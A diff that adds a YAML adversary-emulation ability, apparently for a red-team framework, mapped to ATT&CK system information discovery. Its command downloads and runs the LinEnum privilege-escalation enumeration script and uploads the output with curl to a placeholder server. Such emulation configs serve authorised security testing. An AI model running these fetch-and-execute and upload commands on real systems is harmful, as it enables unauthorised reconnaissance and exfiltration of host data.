@@ -1,0 +1,21 @@
+---
+
+- id: 46098c66-8d9a-4d23-8a95-dd5021c385ae
+  name: Linux Enumeration & Privilege Escalation Discovery Script
+  description: Download and execute LinEnum.sh 
+  tactic: discovery
+  technique: 
+    attack_id: T1082
+    name: System Information Discovery
+  platforms:
+    linux:
+      sh:
+        command: |
+          wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;
+          chmod +x LinEnum.sh;
+          ./LinEnum.sh > /tmp/exfil.txt;
+          curl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;
+          cat /tmp/exfil.txt;
+        cleanup: |
+          rm ./LinEnum.sh;
+          rm /tmp/exfil.txt;
